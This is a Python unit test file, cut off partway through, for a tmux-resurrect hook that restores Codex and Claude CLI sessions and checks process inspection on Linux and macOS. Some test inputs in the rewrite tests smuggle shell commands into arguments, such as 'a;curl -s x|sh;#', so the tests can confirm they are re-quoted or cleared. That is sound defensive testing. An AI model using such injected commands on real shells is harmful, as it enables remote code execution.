"""Unit tests for tmux/resurrect-ai-session.py and the portable restore files."""

from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import os
import re
import select
import shutil
import stat
import subprocess
import sys
import tempfile
import types
import unicodedata
import unittest
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parents[2]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from installer import darwin_proc  # noqa: E402

SCRIPT = REPO_ROOT / "tmux/resurrect-ai-session.py"
SPEC = importlib.util.spec_from_file_location("resurrect_ai_session", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
MODULE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(MODULE)

# LinuxLibSystem and use_library: libproc's calls answered from Linux's
# /proc, so the hook's macOS code runs on Linux with the real darwin_proc.
_HELPERS = importlib.util.spec_from_file_location(
    "darwin_proc_test_helpers", Path(__file__).with_name("test_darwin_proc.py")
)
assert _HELPERS is not None and _HELPERS.loader is not None
DARWIN_PROC_TESTS = importlib.util.module_from_spec(_HELPERS)
_HELPERS.loader.exec_module(DARWIN_PROC_TESTS)

LINUX_PROC = sys.platform.startswith("linux") and os.path.isdir("/proc/self/fd")
HANGUL = "한글"


ID_A = "11111111-2222-4333-8444-555555555555"
ID_B = "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"


def pane_line(command="zsh", full=":zsh"):
    return "\t".join((
        "pane", "work", "2", "1", "-", "5", "title", "/tmp", "1",
        command, full,
    )) + "\n"


class ParserTests(unittest.TestCase):
    def test_codex_parser_is_explicit_and_fail_closed(self):
        self.assertEqual(
            MODULE.codex_resume_id([
                "/usr/bin/codex", "--model", "gpt", "resume", ID_A,
                "--disable", "hooks",
            ]),
            ID_A,
        )
        self.assertIsNone(MODULE.codex_resume_id([
            "codex", "--unknown", "resume", ID_A,
        ]))
        self.assertIsNone(MODULE.codex_resume_id([
            "codex", "-m", "resume", ID_A,
        ]))

    def test_claude_parser_rejects_ambiguous_resume_ids(self):
        self.assertEqual(
            MODULE.claude_resume_id(["claude", "--resume", ID_A]), ID_A
        )
        self.assertIsNone(MODULE.claude_resume_id([
            "claude", "-r", ID_A, "--resume", ID_B,
        ]))
        self.assertIsNone(MODULE.claude_resume_id([
            "claude", "--", "--resume", ID_A,
        ]))

    def test_claude_flags_are_narrow_and_safe(self):
        self.assertEqual(
            MODULE.safe_claude_flags([
                "claude", "--model", "opus[1m]", "--effort", "max",
                "--permission-mode", "bypassPermissions", "--name", "task-1",
            ]),
            ["--model", "opus[1m]", "--effort", "max", "--name", "task-1"],
        )
        self.assertEqual(
            MODULE.safe_claude_flags(["claude", "--name", "bad name"]), []
        )


class IdentityTests(unittest.TestCase):
    def setUp(self):
        # These pin the Linux launcher rule (a no-op on Linux). macOS checks
        # that the launcher exists; DarwinRoutingTests cover its rule.
        patcher = mock.patch.object(MODULE, "DARWIN", False)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_dict_metadata_source_is_handled_without_guessing(self):
        self.assertFalse(MODULE.metadata_is_root({"source": {"other": "value"}}))

    def test_claude_command_uses_canonical_binary_and_unique_id(self):
        processes = [(20, 2, ["/tmp/claude", "--model", "opus", "-r", ID_A])]
        with mock.patch.object(MODULE, "process_tree", return_value=processes), \
             mock.patch.object(MODULE, "claude_metadata_id", return_value=None), \
             mock.patch.object(MODULE.shutil, "which", return_value=None):
            command = MODULE.ai_resume_command(10)
        self.assertEqual(command, [
            str(Path.home() / ".local/bin/claude"),
            "--model", "opus", "--resume", ID_A,
        ])

    def test_claude_launcher_is_resolved_on_path_at_save_time(self):
        processes = [(20, 2, ["claude", "--resume", ID_A])]
        with mock.patch.object(MODULE, "process_tree", return_value=processes), \
             mock.patch.object(MODULE, "claude_metadata_id", return_value=None), \
             mock.patch.object(
                 MODULE.shutil, "which", return_value="/opt/ai/bin/claude"
             ):
            command = MODULE.ai_resume_command(10)
        self.assertEqual(command, ["/opt/ai/bin/claude", "--resume", ID_A])

    def test_relative_path_lookup_falls_back_to_user_launcher(self):
        with mock.patch.object(MODULE.shutil, "which", return_value="bin/claude"):
            self.assertEqual(
                MODULE.claude_executable(),
                str(Path.home() / ".local/bin/claude"),
            )

    def test_multiple_live_ai_ids_are_unresolved(self):
        processes = [
            (20, 2, ["claude", "--resume", ID_A]),
            (21, 3, ["claude", "--resume", ID_B]),
        ]
        with mock.patch.object(MODULE, "process_tree", return_value=processes), \
             mock.patch.object(MODULE, "claude_metadata_id", return_value=None):
            self.assertEqual(MODULE.ai_resume_command(10), [])

    def codex_command(self, argv, locks, roots):
        with mock.patch.object(
            MODULE, "process_tree", return_value=[(20, 2, argv)]
        ), mock.patch.object(
            MODULE, "open_codex_ids", return_value=(locks, [])
        ) as open_ids, mock.patch.object(
            MODULE, "session_metadata",
            side_effect=lambda value, _: (
                {"id": value, "thread_source": "user"} if value in roots
                else None
            ),
        ):
            command = MODULE.ai_resume_command(10)
        self.assertEqual(open_ids.call_count, 1)
        return command

    def test_codex_live_thread_wins_over_stale_resume_argv(self):
        # REQ-2: /new or /resume inside the TUI leaves argv at the old ID.
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_B], {ID_B}),
            ["codex", "resume", ID_B],
        )
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_A], {ID_A}),
            ["codex", "resume", ID_A],
        )

    def test_codex_argv_id_needs_uncontradicted_evidence(self):
        # No live evidence at all: the explicit argv ID stands.
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [], set()),
            ["codex", "resume", ID_A],
        )
        # Only the same ID, unverified: still agrees.
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_A], set()),
            ["codex", "resume", ID_A],
        )
        # A different unverified live ID, or two roots: unresolved.
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_B], set()), []
        )
        self.assertEqual(
            self.codex_command(["codex", "resume", ID_A], [ID_A, ID_B], {ID_A, ID_B}),
            [],
        )

    def test_codex_hooks_flag_follows_the_process_to_the_live_thread(self):
        self.assertEqual(
            self.codex_command(
                ["codex", "resume", ID_A, "--disable", "hooks"], [ID_B], {ID_B}
            ),
            ["codex", "resume", ID_B, "--disable", "hooks"],
        )

    def test_codex_open_ids_require_one_metadata_verified_root(self):
        processes = [(20, 2, ["codex"])]
        with mock.patch.object(MODULE, "process_tree", return_value=processes), \
             mock.patch.object(
                 MODULE, "open_codex_ids",
                 return_value=([ID_A, ID_B], []),
             ), mock.patch.object(
                 MODULE, "session_metadata",
                 side_effect=lambda value, _: {
                     "id": value,
                     "thread_source": "user" if value == ID_A else "subagent",
                 },
             ):
            self.assertEqual(
                MODULE.ai_resume_command(10), ["codex", "resume", ID_A]
            )


class RewriteTests(unittest.TestCase):
    def setUp(self):
        self.panes = {("work", "2", "5"): 123}

    def enrich(self, line, children):
        return MODULE.enrich_state(
            [line], self.panes, lambda _: None, lambda _: children
        )[0]

    def test_ordinary_command_is_byte_for_byte_intact(self):
        line = pane_line("ssh", ":ssh host -- unusual")
        self.assertEqual(
            self.enrich(line, [["ssh", "host", "--", "unusual"]]), line
        )
        shell = pane_line("zsh", ":")
        self.assertEqual(self.enrich(shell, []), shell)

    def test_ordinary_command_is_requoted_from_live_argv(self):
        # SEC-3: resurrect's ps strategy joins argv with spaces, and a restore
        # types the text into the pane's shell.
        line = pane_line("tail", ":tail -f a;curl -s x|sh;#")
        rewritten = self.enrich(line, [["tail", "-f", "a;curl -s x|sh;#"]])
        self.assertTrue(rewritten.endswith("\t:tail -f 'a;curl -s x|sh;#'\n"))
        self.assertEqual(
            MODULE.shlex.split(rewritten.rstrip("\n").split("\t")[10][1:]),
            ["tail", "-f", "a;curl -s x|sh;#"],
        )

    def test_unproven_ordinary_command_is_cleared(self):
        line = pane_line("vim", ":vim a;touch X")
        # No live child with that exact command line (e.g. already exited).
        self.assertTrue(self.enrich(line, []).endswith("\t:\n"))
        self.assertTrue(
            self.enrich(line, [["vim", "b"]]).endswith("\t:\n")
        )
        # Two different children that print the same text: ambiguous.
        self.assertTrue(self.enrich(
            line, [["vim", "a;touch", "X"], ["vim", "a;touch X"]]
        ).endswith("\t:\n"))
        # Arguments that cannot be typed back safely.
        for bad in ("a\u0007b", "a\u001bb", "a\ufffdb"):
            with self.subTest(bad=bad):
                self.assertTrue(self.enrich(
                    pane_line("vim", f":vim {bad}"), [["vim", bad]]
                ).endswith("\t:\n"))

    def test_child_commands_reads_direct_children_only(self):
        import os
        import subprocess
        child = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(30)", "x;y"]
        )
        try:
            commands = MODULE.child_commands(os.getpid())
            expected = [sys.executable, "-c", "import time; time.sleep(30)", "x;y"]
            if MODULE.DARWIN:
                # A framework Python (python.org, Homebrew, Xcode) re-executes
                # itself as Python.app, which replaces argv[0].
                commands = [argv[1:] for argv in commands]
                expected = expected[1:]
            self.assertIn(expected, commands)
            self.assertEqual(MODULE.child_commands(child.pid), [])
        finally:
            child.kill()
            child.wait()

    def test_resolved_and_unresolved_ai_are_rewritten(self):
        resolved = MODULE.enrich_state(
            [pane_line("zsh", ":stale arbitrary command")],
            self.panes,
            lambda _: ["codex", "resume", ID_A],
        )[0]
        self.assertTrue(resolved.endswith(f":codex resume {ID_A}\n"))

        unresolved = MODULE.enrich_state(
            [pane_line("zsh", ":codex --last")], self.panes, lambda _: []
        )[0]
        self.assertTrue(unresolved.endswith("\t:\n"))

        hidden = MODULE.enrich_state(
            [pane_line("zsh", ":zsh -lc '/opt/ai/bin/claude --last'")],
            self.panes,
            lambda _: None,
            lambda _: [["zsh", "-lc", "'/opt/ai/bin/claude", "--last'"]],
        )[0]
        self.assertTrue(hidden.endswith("\t:\n"))

    def test_missing_or_duplicate_match_fails(self):
        with self.assertRaisesRegex(RuntimeError, "not live"):
            MODULE.enrich_state([pane_line()], {}, lambda _: None)
        with self.assertRaisesRegex(RuntimeError, "duplicate snapshot"):
            MODULE.enrich_state(
                [pane_line(), pane_line()], self.panes, lambda _: None
            )

    def test_run_is_atomic_mode_600_and_marks_only_success(self):
        with tempfile.TemporaryDirectory() as directory:
            state = Path(directory) / "last"
            state.write_text(pane_line("zsh", ":old"))
            marker = Path(str(state) + ".ai-ok")
            marker.write_text("stale\n")
            with mock.patch.object(MODULE, "live_panes", return_value=self.panes), \
                 mock.patch.object(
                     MODULE, "ai_resume_command",
                     return_value=["codex", "resume", ID_A],
                 ):
                MODULE.run(state)
            self.assertEqual(stat.S_IMODE(state.stat().st_mode), 0o600)
            self.assertEqual(stat.S_IMODE(marker.stat().st_mode), 0o600)
            self.assertEqual(marker.read_text(), "last\n")

            marker.write_text("stale\n")
            with mock.patch.object(MODULE, "live_panes", return_value={}):
                with self.assertRaises(RuntimeError):
                    MODULE.run(state)
            self.assertFalse(marker.exists())

    def test_unique_marker_path_from_environment(self):
        with tempfile.TemporaryDirectory() as directory:
            state = Path(directory) / "snapshot"
            marker = Path(directory) / "hook-marker"
            state.write_text(pane_line())
            with mock.patch.dict(
                "os.environ", {"TMUX_RESURRECT_HOOK_OK": str(marker)}
            ), mock.patch.object(
                MODULE, "live_panes", return_value=self.panes
            ), mock.patch.object(MODULE, "ai_resume_command", return_value=None), \
                 mock.patch.object(MODULE, "child_commands", return_value=[]):
                MODULE.run(state)
            self.assertEqual(marker.read_text(), "snapshot\n")
            self.assertFalse(Path(str(state) + ".ai-ok").exists())


# --- macOS: the same rules over installer/darwin_proc.py ---------------------

class FakeDarwinProc:
    """installer/darwin_proc.py's API over a made-up process table.

    ``processes`` maps pid -> (ppid, start in seconds, argv), where an empty
    argv is a process whose arguments cannot be read (a zombie, another
    user's); ``files`` maps pid -> names of its open files, or (name,
    nlink) for an unlinked one (a pid missing there is one whose
    descriptors cannot be read); ``exec_paths`` maps pid -> the path it was
    started with.
    """

    def __init__(self, processes, files=None, exec_paths=None):
        self.processes = processes
        self.files = files or {}
        self.exec_paths = exec_paths or {}

    def available(self):
        return True

    def unavailable_reason(self):
        return None

    def all_pids(self):
        return list(self.processes)

    def children(self, pid):
        return [child for child, (ppid, _, _) in self.processes.items() if ppid == pid]

    def bsd_info(self, pid):
        if pid not in self.processes:
            return None
        ppid, start, argv = self.processes[pid]
        return darwin_proc.BsdInfo(
            pid=pid, ppid=ppid, uid=501, pgid=pid, tdev=darwin_proc.NODEV,
            tpgid=0, comm=os.path.basename(argv[0])[:15] if argv else "",
            name="", status=darwin_proc.SRUN, start=start,
        )

    def argv(self, pid):
        entry = self.processes.get(pid)
        return list(entry[2]) if entry and entry[2] else None

    def open_vnodes(self, pid):
        if pid not in self.files:
            return None
        entries = [
            item if isinstance(item, tuple) else (item, 1) for item in self.files[pid]
        ]
        return [
            darwin_proc.VnodeFd(
                fd=3 + index, path=path, dev=1, ino=100 + index, nlink=nlink,
                mode=stat.S_IFREG | 0o600, size=0, cloexec=True, uid=501,
                openflags=darwin_proc.FREAD,
            )
            for index, (path, nlink) in enumerate(entries)
        ]

    def exec_path(self, pid):
        return self.exec_paths.get(pid)


def pane_row(index, command, full):
    return "\t".join((
        "pane", "work", "2", "1", "-", str(index), "title", "/tmp", "1",
        command, full,
    )) + "\n"


def saved_commands(snapshot):
    return [row.split("\t")[10] for row in snapshot.splitlines()]


class DarwinHookCase(unittest.TestCase):
    """The hook as it runs on macOS (DARWIN), on any test machine."""

    def use_darwin(self, backend=None, loader=None):
        """Route the hook through ``backend`` (or whatever ``loader``
        returns or raises in place of installer/darwin_proc.py), with its
        stderr captured in self.stderr."""
        replacements = {
            "DARWIN": True, "_darwin_proc": None, "_darwin_problem": None,
            "_warned": False, "_import_darwin_proc": loader or (lambda: backend),
        }
        for name, value in replacements.items():
            self.patch(MODULE, name, value)
        # macOS has no /proc: its readers must never run there.
        for name in ("proc_stat", "proc_cmdline"):
            self.patch(MODULE, name, mock.Mock(side_effect=AssertionError(name)))
        self.stderr = io.StringIO()
        redirect = contextlib.redirect_stderr(self.stderr)
        redirect.__enter__()
        self.addCleanup(redirect.__exit__, None, None, None)

    def patch(self, target, name, value):
        patcher = mock.patch.object(target, name, value)
        patcher.start()
        self.addCleanup(patcher.stop)

    def home(self):
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        patcher = mock.patch.dict(os.environ, {"HOME": directory.name})
        patcher.start()
        self.addCleanup(patcher.stop)
        return Path(directory.name)

    @staticmethod
    def executable(path, mode=0o755):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("#!/bin/sh\n")
        path.chmod(mode)
        return str(path)

    def rollout(self, home, conversation_id, meta=None):
        path = home / ".codex/sessions/2026/10/11" / (
            f"rollout-2026-10-11T09-00-00-{conversation_id}.jsonl"
        )
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("" if meta is None else json.dumps(
            {"type": "session_meta", "payload": dict(meta, id=conversation_id)}
        ) + "\n")
        return path


class DarwinRoutingTests(DarwinHookCase):
    def test_process_tree_walks_the_libproc_table(self):
        self.use_darwin(FakeDarwinProc({
            10: (1, 100.0, ["-zsh"]),
            20: (10, 101.5, ["node", "/opt/homebrew/bin/codex", "", "resume"]),
            30: (20, 101.25, ["/opt/homebrew/lib/codex/codex", "resume", ID_A]),
            40: (1, 50.0, ["unrelated"]),
            50: (30, 102.0, []),  # no readable argv: left out, as on Linux
        }))
        self.assertEqual(MODULE.process_tree(10), [
            (10, 100000000, ["-zsh"]),
            # macOS argv keeps empty arguments.
            (20, 101500000, ["node", "/opt/homebrew/bin/codex", "", "resume"]),
            (30, 101250000, ["/opt/homebrew/lib/codex/codex", "resume", ID_A]),
        ])
        self.assertEqual(MODULE.process_tree(99), [])
        self.assertEqual(self.stderr.getvalue(), "")

    def test_child_commands_keep_empty_arguments_and_are_requoted(self):
        self.use_darwin(FakeDarwinProc({
            123: (1, 1.0, ["-zsh"]),
            124: (123, 2.0, ["vim", "", "two words"]),
            125: (124, 3.0, ["grandchild"]),
            126: (123, 4.0, []),
        }))
        self.assertEqual(MODULE.child_commands(123), [["vim", "", "two words"]])
        # macOS ps joins argv with spaces, an empty argument as a double
        # space; that live argv proves the text and is re-quoted.
        rewritten = MODULE.enrich_state(
            [pane_line("vim", ":vim  two words")], {("work", "2", "5"): 123},
            lambda _: None,
        )[0]
        self.assertTrue(rewritten.endswith("\t:vim '' 'two words'\n"), rewritten)

    def test_open_codex_ids_reads_libproc_file_names(self):
        home = self.home()
        rollout = self.rollout(home, ID_B)
        firmlinked = Path(
            "/System/Volumes/Data" + os.path.realpath(home)
            + f"/.codex/sessions/2026/10/11/rollout-x-{ID_A}.jsonl"
        )
        self.use_darwin(FakeDarwinProc({30: (1, 1.0, ["codex"])}, files={30: [
            f"{home}/.codex/thread-writer-locks/{ID_A}.lock",
            str(rollout),
            str(firmlinked),
            "",  # the kernel has no name for it
            # Unlinked files that kept their names: on Linux they read
            # "<path> (deleted)", which neither check matches.
            (f"{home}/.codex/thread-writer-locks/{ID_B}.lock", 0),
            (str(rollout.with_name(f"rollout-2026-10-11T08-00-00-{ID_A}.jsonl")), 0),
            "/dev/ttys003",
            f"/tmp/elsewhere/rollout-x-{ID_B}.jsonl",  # outside ~/.codex/sessions
            f"{home}/.codex/thread-writer-locks/not-a-thread.lock",
        ]}))
        locks, rollouts = MODULE.open_codex_ids(30)
        self.assertEqual(locks, [ID_A])
        self.assertEqual(sorted(rollouts), sorted([(rollout, ID_B), (firmlinked, ID_A)]))
        # Descriptors that cannot be read give no live ID.
        self.assertEqual(MODULE.open_codex_ids(31), ([], []))

    def test_rollout_names_compare_in_any_unicode_normalization(self):
        # APFS takes every normalization of a name for the same name, so
        # the kernel may spell the home folder unlike HOME does.
        home = self.home() / f"{HANGUL} café"
        rollout = self.rollout(home, ID_A)
        spelled = unicodedata.normalize("NFD", str(rollout))
        self.assertNotEqual(spelled, str(rollout))
        self.use_darwin(FakeDarwinProc({30: (1, 1.0, ["codex"])}, files={30: [spelled]}))
        with mock.patch.dict(os.environ, {"HOME": str(home)}):
            self.assertEqual(MODULE.open_codex_ids(30), ([], [(Path(spelled), ID_A)]))

    def test_codex_live_thread_is_proven_through_libproc(self):
        home = self.home()
        rollout = self.rollout(home, ID_B, {"thread_source": "user"})
        self.use_darwin(FakeDarwinProc(
            {
                10: (1, 1.0, ["-zsh"]),
                30: (10, 2.0, ["codex", "resume", ID_A, "--disable", "hooks"]),
            },
            files={30: [f"{home}/.codex/thread-writer-locks/{ID_B}.lock", str(rollout)]},
        ))
        self.assertEqual(
            MODULE.ai_resume_command(10), ["codex", "resume", ID_B, "--disable", "hooks"]
        )

    def test_claude_launcher_prefers_the_path_the_process_was_started_with(self):
        home = self.home()
        launched = self.executable(home / "bin/claude")
        on_path = self.executable(home / "path/claude")
        user = self.executable(home / ".local/bin/claude")
        brew = self.executable(home / "brew/bin/claude")
        self.use_darwin(FakeDarwinProc({}))
        self.patch(MODULE, "DARWIN_CLAUDE_LAUNCHERS", (brew,))
        with mock.patch.object(MODULE.shutil, "which", return_value=on_path):
            self.assertEqual(MODULE.claude_executable(launched), launched)
            # Versioned installs stop working at the next update; the rest
            # cannot be typed back or restored by resurrect.conf's pattern.
            for skipped in (
                self.executable(home / "share/claude/versions/2.1.0/claude"),
                self.executable(home / "Caskroom/claude-code/2.1.0/claude"),
                self.executable(home / "Cellar/claude/2.1.0/bin/claude"),
                self.executable(home / "two words/claude"),
                self.executable(home / "bin/Claude"),
                self.executable(home / "plain/claude", 0o644),
                str(home / "missing/claude"),
                "bin/claude",
                "/claude",
                "",
                None,
            ):
                with self.subTest(exec_path=skipped):
                    self.assertEqual(MODULE.claude_executable(skipped), on_path)
        # Then ~/.local/bin/claude, then Homebrew's bin directories.
        with mock.patch.object(MODULE.shutil, "which", return_value=None):
            self.assertEqual(MODULE.claude_executable(None), user)
            os.unlink(user)
            self.assertEqual(MODULE.claude_executable(None), brew)
            os.unlink(brew)
            self.assertIsNone(MODULE.claude_executable(None))

    def test_claude_pane_without_a_launcher_stays_unresolved(self):
        home = self.home()
        argv = ["claude", "--model", "opus", "", "--resume", ID_A]
        self.use_darwin(FakeDarwinProc(
            {10: (1, 1.0, ["-zsh"]), 20: (10, 2.0, argv)},
            exec_paths={20: str(home / "bin/claude")},
        ))
        self.patch(MODULE, "DARWIN_CLAUDE_LAUNCHERS", ())
        with mock.patch.object(MODULE.shutil, "which", return_value=None):
            self.assertEqual(MODULE.ai_resume_command(10), [])
            launcher = self.executable(home / "bin/claude")
            self.assertEqual(
                MODULE.ai_resume_command(10),
                [launcher, "--model", "opus", "--resume", ID_A],
            )

    def test_program_names_ignore_case_on_macos_only(self):
        self.use_darwin(FakeDarwinProc({}))
        panes = {("work", "2", "5"): 123}
        cases = (
            # (argv[0], pane_current_command, saved command, live child)
            ("/opt/x/CODEX", "Codex", ":stale", ["stale"]),
            ("Claude", "zsh", ":CLAUDE --last", ["CLAUDE", "--last"]),
        )
        for name, current, saved, child in cases:
            with self.subTest(name=name):
                self.assertIn(MODULE.program_kind([name]), {"codex", "claude"})
                rewritten = MODULE.enrich_state(
                    [pane_line(current, saved)], panes, lambda _: None, lambda _: [child]
                )[0]
                self.assertTrue(rewritten.endswith("\t:\n"), rewritten)
                with mock.patch.object(MODULE, "DARWIN", False):
                    self.assertIsNone(MODULE.program_kind([name]))
                    rewritten = MODULE.enrich_state(
                        [pane_line(current, saved)], panes, lambda _: None,
                        lambda _: [child],
                    )[0]
                    self.assertTrue(rewritten.endswith("\t" + saved + "\n"), rewritten)

    def test_atomic_write_flushes_the_drive_cache_on_macos(self):
        import fcntl

        calls = []

        def record(fd, command, *args):
            calls.append(command)
            if len(calls) == 2:
                raise OSError("not supported by this file system")
            return 0

        with tempfile.TemporaryDirectory() as directory, \
             mock.patch.object(fcntl, "F_FULLFSYNC", 51, create=True), \
             mock.patch.object(fcntl, "fcntl", side_effect=record):
            path = Path(directory) / "last"
            with mock.patch.object(MODULE, "DARWIN", True):
                MODULE.atomic_write(path, "one\n")
                MODULE.atomic_write(path, "two\n")  # F_FULLFSYNC refused
            self.assertEqual(calls, [51, 51])
            self.assertEqual(path.read_text(), "two\n")
            with mock.patch.object(MODULE, "DARWIN", False):
                MODULE.atomic_write(path, "three\n")  # Linux: fsync alone
            self.assertEqual(calls, [51, 51])
            self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o600)


class DarwinBackendFailureTests(DarwinHookCase):
    """Without working process inspection the hook still saves: layout,
    directories and pane contents, with every pane command cleared."""

    ROWS = (
        pane_row(0, "vim", ":vim notes.md"),
        pane_row(1, "codex", f":codex resume {ID_A}"),
        pane_row(2, "zsh", ":"),
    )

    def save(self):
        """run() over ROWS; (snapshot text, marker text or None)."""
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        state = Path(directory.name) / "last"
        state.write_text("".join(self.ROWS))
        panes = {("work", "2", str(index)): 100 + index for index in range(len(self.ROWS))}
        with mock.patch.object(MODULE, "live_panes", return_value=panes), \
             mock.patch.dict(os.environ):
            os.environ.pop("TMUX_RESURRECT_HOOK_OK", None)
            MODULE.run(state)
        marker = Path(str(state) + ".ai-ok")
        return state.read_text(), marker.read_text() if marker.exists() else None

    def assert_saved_with_one_warning(self, reason):
        snapshot, marker = self.save()
        self.assertEqual(saved_commands(snapshot), [":", ":", ":"])
        self.assertEqual(marker, "last\n")
        lines = self.stderr.getvalue().splitlines()
        self.assertEqual(len(lines), 1, lines)
        self.assertIn(reason, lines[0])
        self.assertIn("cleared", lines[0])

    def test_an_unavailable_backend_warns_once_and_the_snapshot_is_saved(self):
        broken = types.SimpleNamespace(
            available=lambda: False, unavailable_reason=lambda: "libproc refused (test)"
        )
        self.use_darwin(loader=lambda: broken)
        self.assert_saved_with_one_warning("libproc refused (test)")

    def test_a_backend_that_cannot_be_loaded_is_unavailable(self):
        def loader():
            raise ImportError("No module named 'installer'")

        self.use_darwin(loader=loader)
        self.assert_saved_with_one_warning(
            "cannot load installer/darwin_proc.py: No module named 'installer'"
        )

    def test_a_process_table_that_cannot_be_read_clears_and_warns(self):
        class NoTable(FakeDarwinProc):
            def all_pids(self):
                return None

            def children(self, pid):
                return None

        self.use_darwin(NoTable({}))
        self.assert_saved_with_one_warning("the process table cannot be read")

    def test_a_backend_call_that_raises_still_saves(self):
        class Raising(FakeDarwinProc):
            def all_pids(self):
                raise RuntimeError("boom")

            def children(self, pid):
                raise RuntimeError("bang")

        self.use_darwin(Raising({}))
        self.assert_saved_with_one_warning("darwin_proc.all_pids failed: boom")


class DarwinBackendImportTests(unittest.TestCase):
    def test_backend_is_loaded_from_this_checkout_without_bytecode(self):
        root = str(REPO_ROOT)
        path = [entry for entry in sys.path if os.path.abspath(entry or os.curdir) != root]
        expected = list(path)
        with mock.patch.object(sys, "path", path), mock.patch.dict(sys.modules), \
             mock.patch.object(sys, "dont_write_bytecode", False):
            for name in [n for n in sys.modules if n.split(".")[0] == "installer"]:
                del sys.modules[name]
            module = MODULE._import_darwin_proc()
            # Set before the import: the checkout is installer-owned source.
            self.assertTrue(sys.dont_write_bytecode)
            self.assertEqual(sys.path, expected)  # the checkout is taken off again
        self.assertEqual(
            Path(module.__file__).resolve(), REPO_ROOT / "installer/darwin_proc.py"
        )
        self.assertTrue(callable(module.available))


class SelfTestTests(unittest.TestCase):
    """--self-test, which install, repair and status run (round 2)."""

    def run_self_test(self):
        stdout, stderr = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            status = MODULE.self_test()
        return status, stdout.getvalue(), stderr.getvalue()

    def test_process_inspection_works_on_this_machine(self):
        completed = subprocess.run(
            [sys.executable, "-B", str(SCRIPT), "--self-test"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=120,
        )
        self.assertEqual(completed.returncode, 0, completed.stderr)
        self.assertIn("process inspection works", completed.stdout)
        self.assertEqual(completed.stderr, "")

    def test_every_failed_check_has_a_reason(self):
        cases = (
            ("child_commands", {"return_value": []}, "the exact argv of a child"),
            ("process_tree", {"return_value": []}, "the process tree"),
            ("open_codex_ids", {"return_value": ([], [])}, "files a process holds open"),
            ("child_commands", {"side_effect": OSError("broken")}, "unexpected error: broken"),
        )
        for name, behaviour, reason in cases:
            with self.subTest(name=name, reason=reason), \
                 mock.patch.object(MODULE, name, **behaviour):
                status, stdout, stderr = self.run_self_test()
                self.assertEqual(status, 1)
                self.assertEqual(stdout, "")
                self.assertIn(f"self-test failed on {sys.platform}: ", stderr)
                self.assertIn(reason, stderr)

    def test_a_child_that_never_starts_fails(self):
        with mock.patch.object(MODULE, "SELF_TEST_CHILD", "pass"):
            status, _, stderr = self.run_self_test()
        self.assertEqual(status, 1)
        self.assertIn("did not start", stderr)

    def test_an_unavailable_macos_backend_fails(self):
        broken = types.SimpleNamespace(
            available=lambda: False, unavailable_reason=lambda: "libproc refused (test)"
        )
        with mock.patch.multiple(
            MODULE, DARWIN=True, _darwin_proc=None, _darwin_problem=None,
            _warned=False, _import_darwin_proc=lambda: broken,
        ):
            status, _, stderr = self.run_self_test()
        self.assertEqual(status, 1)
        # One line: the self-test's own report, not the save warning too.
        self.assertEqual(len(stderr.splitlines()), 1, stderr)
        self.assertIn("libproc refused (test)", stderr)

    def test_linux_without_proc_fails(self):
        isdir = os.path.isdir
        with mock.patch.object(MODULE, "DARWIN", False), mock.patch.object(
            MODULE.os.path, "isdir",
            side_effect=lambda path: not str(path).startswith("/proc") and isdir(path),
        ):
            status, _, stderr = self.run_self_test()
        self.assertEqual(status, 1)
        self.assertIn("/proc is not available", stderr)


# The live scenarios' processes: a child that starts a grandchild (both
# block on their shared stdin), and a child that holds the files it is given.
GRANDCHILD = "import sys; sys.stdout.write('ready\\n'); sys.stdout.flush(); sys.stdin.read()"
PARENT = (
    "import subprocess, sys; "
    f"g = subprocess.Popen([sys.executable, '-c', {GRANDCHILD!r}], stdout=subprocess.PIPE); "
    "g.stdout.readline(); sys.stdout.write('ready %d\\n' % g.pid); sys.stdout.flush(); "
    "sys.stdin.read(); g.wait()"
)
HOLDER = (
    "import sys; held = [open(p, 'rb') for p in sys.argv[1:]]; "
    "sys.stdout.write('ready\\n'); sys.stdout.flush(); sys.stdin.read()"
)
LIVE_ARGS = ["", "two words", HANGUL, ""]


def nfc(text):
    return unicodedata.normalize("NFC", text)


class LiveHookScenarios:
    """The hook's own process inspection against live processes. argv[0] is
    never compared: a framework Python re-executes itself as Python.app."""

    def spawn(self, code, *arguments):
        child = subprocess.Popen(
            [sys.executable, "-c", code, *arguments],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        )
        self.addCleanup(self.reap, child)
        ready, _, _ = select.select([child.stdout], [], [], 30)
        line = child.stdout.readline() if ready else b""
        self.assertTrue(line.startswith(b"ready"), line)
        return child, line

    @staticmethod
    def reap(child):
        child.stdin.close()  # end of input: the child and its grandchild exit
        try:
            child.wait(timeout=10)
        except subprocess.TimeoutExpired:
            child.kill()
            child.wait()
        child.stdout.close()

    def test_process_tree_and_child_commands_see_exact_argv(self):
        child, line = self.spawn(PARENT, *LIVE_ARGS)
        grandchild = int(line.split()[1])
        tree = {pid: argv[1:] for pid, _, argv in MODULE.process_tree(os.getpid())}
        self.assertEqual(tree[child.pid], ["-c", PARENT, *LIVE_ARGS])
        self.assertEqual(tree[grandchild], ["-c", GRANDCHILD])
        self.assertIn(
            ["-c", PARENT, *LIVE_ARGS],
            [argv[1:] for argv in MODULE.child_commands(os.getpid())],
        )
        self.assertEqual(
            [argv[1:] for argv in MODULE.child_commands(child.pid)], [["-c", GRANDCHILD]]
        )

    def test_open_codex_ids_sees_a_held_lock_and_rollout(self):
